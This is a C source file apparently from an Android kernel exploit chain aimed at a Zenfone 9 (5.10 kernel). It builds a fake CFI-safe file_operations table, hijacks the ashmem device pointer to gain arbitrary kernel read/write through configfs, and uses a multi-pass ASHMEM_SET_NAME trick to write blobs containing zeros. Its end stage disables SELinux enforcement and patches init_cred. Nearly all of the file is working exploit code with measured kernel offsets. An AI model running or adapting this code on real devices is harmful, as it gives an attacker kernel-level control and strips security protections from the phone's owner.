/* Path A: CFI-safe ashmem fops redirect -> configfs bin r/w = precise kernel r/w.
 *
 * Ported from sarabpal-dev/IonStack-S22U (src/util.c put_fake_fops_table /
 * try_put_blob_* / configfs_{write,read}_once, src/fops.c try_cfi_stage) onto
 * this tree.  Every constant below was MEASURED on our own kernel.elf /
 * kallsyms (see ZENFONE9_STATUS.md §124.9) - do not substitute from another
 * device: SM8475 (Zenfone 9, 5.10.205-android12-9) differs.
 *
 * Why the .cfi_jt addresses: CONFIG_CFI_CLANG=y, so every function pointer in
 * a replaced fops table must be the canonical jump-table stub; a raw kallsyms
 * address panics with "CFI failure" on the first indirect call
 * (misc_open -> f_op->open).
 */
#include "common.h"
#include <sys/ioctl.h>

/* ---- our device's CFI jump-table entries (image offsets; kernel.elf symtab) */
#define JT_NOOP_LLSEEK_OFF              0x181f7a0ULL
#define JT_ASHMEM_LLSEEK_OFF            0x181f850ULL
#define JT_ASHMEM_MMAP_OFF              0x1822368ULL
#define JT_ASHMEM_SHOW_FDINFO_OFF       0x18224e8ULL
#define JT_CONFIGFS_READ_FILE_OFF       0x182f468ULL
#define JT_CONFIGFS_READ_BIN_FILE_OFF   0x182f470ULL
#define JT_CONFIGFS_WRITE_BIN_FILE_OFF  0x182f980ULL
#define JT_ASHMEM_OPEN_OFF              0x1830b98ULL
#define JT_ASHMEM_RELEASE_OFF           0x1830ba0ULL
#define JT_ASHMEM_IOCTL_OFF             0x1836fa8ULL
#define JT_COMPAT_ASHMEM_IOCTL_OFF      0x1836fb0ULL
#define JT_UMH_EXEC_WORK_OFF            0x183d7a8ULL

#define IMG_ASHMEM_FOPS  0xffffffc00a2a83f0ULL /* struct file_operations ashmem_fops */
#define IMG_ASHMEM_MISC  0xffffffc00a8e7318ULL /* struct miscdevice ashmem_misc     */
/* miscdevice.fops lives at +0x10 -> the field whose VALUE we redirect */
#define IMG_ASHMEM_MISC_FOPS (IMG_ASHMEM_MISC + 0x10)

/* ---- struct file_operations offsets (measured empirically, §5) */
#define FOPS_OWNER_OFF            0x00
#define FOPS_LLSEEK_OFF           0x08
#define FOPS_READ_OFF             0x10
#define FOPS_WRITE_OFF            0x18
#define FOPS_READ_ITER_OFF        0x20
#define FOPS_WRITE_ITER_OFF       0x28
#define FOPS_IOCTL_OFF            0x50
#define FOPS_COMPAT_IOCTL_OFF     0x58
#define FOPS_MMAP_OFF             0x60
#define FOPS_OPEN_OFF             0x70
#define FOPS_RELEASE_OFF          0x80
#define FOPS_SPLICE_READ_OFF      0xc8
#define FOPS_SHOW_FDINFO_OFF      0xe0

/* ---- struct configfs_buffer offsets (5.10 + GKI ANDROID_OEM_DATA padding) */
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

/* ---- ashmem ioctl ---- */
#define __ASHMEMIOC 0x77
#define ASHMEM_NAME_LEN 256
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_NAME_PREFIX_LEN 11

static const char *cfi_ashmem_path = "/dev/ashmem";

static void cfi_put64(unsigned char *p, size_t off, uint64_t v) {
  memcpy(p + off, &v, sizeof(v));
}
static void cfi_put32(unsigned char *p, size_t off, uint32_t v) {
  memcpy(p + off, &v, sizeof(v));
}

int cfi_open_ashmem(void) {
  return open(cfi_ashmem_path, O_RDWR | O_CLOEXEC);
}

/* Fill a fake file_operations table at page[off].  canon_addr() applies the
 * KASLR slide, so this must be called after the slide round (or with nokaslr). */
void cfi_fill_fake_fops(unsigned char *page, size_t off) {
  cfi_put64(page, off + FOPS_OWNER_OFF, 0);
  cfi_put64(page, off + FOPS_LLSEEK_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_LLSEEK_OFF));
  cfi_put64(page, off + FOPS_READ_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_CONFIGFS_READ_FILE_OFF));
  cfi_put64(page, off + FOPS_WRITE_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_CONFIGFS_WRITE_BIN_FILE_OFF));
  cfi_put64(page, off + FOPS_READ_ITER_OFF, 0);
  cfi_put64(page, off + FOPS_WRITE_ITER_OFF, 0);
  cfi_put64(page, off + FOPS_IOCTL_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_IOCTL_OFF));
  cfi_put64(page, off + FOPS_COMPAT_IOCTL_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_COMPAT_ASHMEM_IOCTL_OFF));
  cfi_put64(page, off + FOPS_MMAP_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_MMAP_OFF));
  cfi_put64(page, off + FOPS_OPEN_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_OPEN_OFF));
  cfi_put64(page, off + FOPS_RELEASE_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_RELEASE_OFF));
  cfi_put64(page, off + FOPS_SPLICE_READ_OFF, 0);
  cfi_put64(page, off + FOPS_SHOW_FDINFO_OFF, canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_SHOW_FDINFO_OFF));
}

/* The multi-pass ASHMEM_SET_NAME trick: ashmem_set_name() does
 * strscpy(asma->name + ASHMEM_NAME_PREFIX_LEN, name, ASHMEM_NAME_LEN), and
 * strscpy copies word-at-a-time zero-masking each byte after the NUL.  So a
 * blob containing zeros cannot be written in one shot: pass 1 writes every
 * non-zero byte (zeros replaced by 1), then each zero position is re-issued
 * from the last one backwards, truncating the copy there and leaving the
 * bytes after it from pass 1. */
static int cfi_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? (char)blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int cfi_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? (char)blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int cfi_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (cfi_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }
  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 && cfi_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* One precise write of `len` bytes to kernel address `target`, through the
 * configfs bin path now reachable from /dev/ashmem's fd. */
ssize_t cfi_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t aligned = target - (uintptr_t)pos;
  cfi_put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, aligned);
  cfi_put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
            (uint32_t)((uint64_t)pos + len));
  cfi_put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (cfi_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) {
    return -1;
  }
  return pwrite(fd, data, len, pos);
}

ssize_t cfi_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t page = target - (uintptr_t)pos;
  cfi_put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  cfi_put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (cfi_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) {
    return -1;
  }
  return pread(fd, data, len, pos);
}

/* ---- the stage driver ---------------------------------------------------- */

/* Where the fake fops table lives inside our physmap payload page.  Offset 0
 * of that page holds the sweep magic (0x4d41474943000001), so the table starts
 * at 0x10 and ends at 0xf8 (show_fdinfo + 8) - for free, before PM_LOCK_OFF. */
#define PM_FOPS_OFF 0x10
/* §124.13 scratch word for the write self-check: inside our own payload page,
   between the fake lock (0x100) and fake_w0 (0x300), unused by any payload mode. */
#define CFI_SCRATCH_OFF 0x1F0

int cfi_stage(unsigned char *page, uintptr_t page_alias) {
  if (page == NULL || page_alias == 0) {
    pr_error("cfi: no payload page (page=%p alias=%016zx)\n", (void *)page,
             (size_t)page_alias);
    return 0;
  }
  cfi_fill_fake_fops(page, PM_FOPS_OFF);
  uintptr_t fake_fops = page_alias + PM_FOPS_OFF;
  pr_info("cfi: fake fops table at %016zx (alias %016zx) - llseek=%016zx "
          "read=%016zx write=%016zx open=%016zx\n",
          (size_t)fake_fops, (size_t)page_alias,
          (size_t)canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_LLSEEK_OFF),
          (size_t)canon_addr(KIMAGE_TEXT_BASE + JT_CONFIGFS_READ_FILE_OFF),
          (size_t)canon_addr(KIMAGE_TEXT_BASE + JT_CONFIGFS_WRITE_BIN_FILE_OFF),
          (size_t)canon_addr(KIMAGE_TEXT_BASE + JT_ASHMEM_OPEN_OFF));

  int fd = cfi_open_ashmem();
  if (fd < 0) {
    pr_error("cfi: open(/dev/ashmem) failed errno=%d\n", errno);
    return 0;
  }
  /* Self-check: read the fops field through the configfs path and confirm the
   * shape-0 write already pointed it at our table.  If this read works at all,
   * the primitive is live; the value tells us whether the redirect landed. */
  uint64_t cur = 0;
  ssize_t rd = cfi_read_once(fd, canon_addr(IMG_ASHMEM_MISC_FOPS), &cur, sizeof(cur));
  pr_info("cfi: probe ashmem_misc.fops rd=%zd value=%016llx want=%016zx%s\n",
          rd, (unsigned long long)cur, (size_t)fake_fops,
          (cur == (uint64_t)fake_fops) ? " MATCH" : "");

  /* §124.13 write self-check: target a scratch word inside OUR OWN payload page
     (0x1F0, between the lock at 0x100 and w0 at 0x300), so even a wild write
     costs nothing.  Three-way compare: what the configfs write path wrote, what
     the configfs read path returns, and what the userspace mapping of the same
     physical page sees (the page is double-mapped - a REAL test of the alias). */
  uint64_t magic = 0x4346495f52575f31ULL;   /* "CFI_RW_1" */
  ssize_t wr = cfi_write_once(fd, page_alias + CFI_SCRATCH_OFF, &magic, sizeof(magic));
  uint64_t rb = 0;
  ssize_t rd2 = cfi_read_once(fd, page_alias + CFI_SCRATCH_OFF, &rb, sizeof(rb));
  uint64_t us = 0;
  memcpy(&us, page + CFI_SCRATCH_OFF, sizeof(us));
  int rw_ok = (wr == (ssize_t)sizeof(magic)) && (rd2 == (ssize_t)sizeof(rb)) &&
              (rb == magic);
  pr_info("cfi: rw self-check wr=%zd rd=%zd kern=%016llx user=%016llx magic=%016llx%s\n",
          wr, rd2, (unsigned long long)rb, (unsigned long long)us,
          (unsigned long long)magic, rw_ok ? " RW-OK" : " RW-FAIL");

  /* §124.19 minimal end-game, all inside the redirect window (the precise write
     exists only until RESTORED):
       - SELinux enforcing = 0  (this is what unblocks exec/IO for the kernel
         domain; S22U's proof: `getenforce` = Permissive ??their root shell works)
       - the two seq-independent debt repairs (async_lock.owner, init_cred+8).
     NOTE: pipe physrw is NOT ported - Option 1's victim is already uid 0 with
     u:r:init:s0, so no durable r/w and no cred swap are needed; only the module
     load remains (done by the victim after this stage). */
  uint32_t zero32 = 0;
  ssize_t e_wr = cfi_write_once(fd, canon_addr(SELINUX_ENFORCING), &zero32,
                                sizeof(zero32));
  uint32_t e_rb = 1;
  ssize_t e_rd = cfi_read_once(fd, canon_addr(SELINUX_ENFORCING), &e_rb,
                               sizeof(e_rb));
  pr_info("cfi: enforcing=0 wr=%zd rd=%zd now=%u%s\n", e_wr, e_rd, e_rb,
          (e_rb == 0) ? " PERMISSIVE" : " (still enforcing)");

  uint64_t zero64 = 0;
  ssize_t a_wr = cfi_write_once(fd, canon_addr(CAD_PID_IMAGE) + 8, &zero64,
                                sizeof(zero64));
  uint64_t c_rb = 1;
  cfi_read_once(fd, canon_addr(INIT_CRED) + 8, &c_rb, sizeof(c_rb));
  ssize_t c_wr = cfi_write_once(fd, canon_addr(INIT_CRED) + 8, &zero64,
                                sizeof(zero64));
  pr_info("cfi: debt repair async_lock.owner=%zd init_cred+8=%zd (was %016llx)\n",
          a_wr, c_wr, (unsigned long long)c_rb);

  /* Restore the genuine fops IMMEDIATELY (S22U's hard discipline): any system
     process opening /dev/ashmem from here on must see the real file_operations.
     Then drop the fake table's owner slot (module refcount slot). */
  uint64_t real_fops = (uint64_t)canon_addr(IMG_ASHMEM_FOPS);
  ssize_t rr = cfi_write_once(fd, canon_addr(IMG_ASHMEM_MISC_FOPS), &real_fops,
                              sizeof(real_fops));
  uint64_t back = 0;
  ssize_t rd3 = cfi_read_once(fd, canon_addr(IMG_ASHMEM_MISC_FOPS), &back, sizeof(back));
  pr_info("cfi: restore fops wr=%zd rd=%zd now=%016llx want=%016llx%s\n",
          rr, rd3, (unsigned long long)back, (unsigned long long)real_fops,
          (back == real_fops) ? " RESTORED" : " RESTORE-FAIL");
  memset(page + PM_FOPS_OFF, 0, 8);
  close(fd);
  return rw_ok;
}

/* §124.11: the field the redirect write targets, KASLR-resolved. */
uintptr_t cfi_misc_fops_field(void) { return canon_addr(IMG_ASHMEM_MISC_FOPS); }
